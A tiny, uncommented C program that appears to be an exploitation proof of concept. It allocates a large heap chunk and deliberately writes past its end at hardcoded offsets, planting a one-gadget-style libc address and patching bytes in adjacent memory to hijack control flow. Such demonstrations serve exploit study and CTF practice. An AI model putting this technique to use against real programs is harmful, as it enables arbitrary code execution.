#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  unsigned char *ptr;
  ptr = malloc(0x200000);


  unsigned long base = 0x7f2158;


  *(unsigned long long *)&ptr[base] = 0x7ffff7a52216-0x4002b8;

  ptr[base + 0xa8] = 0xb8;

  ptr[base + 0x120] = 0xe3;


  return 0;
}
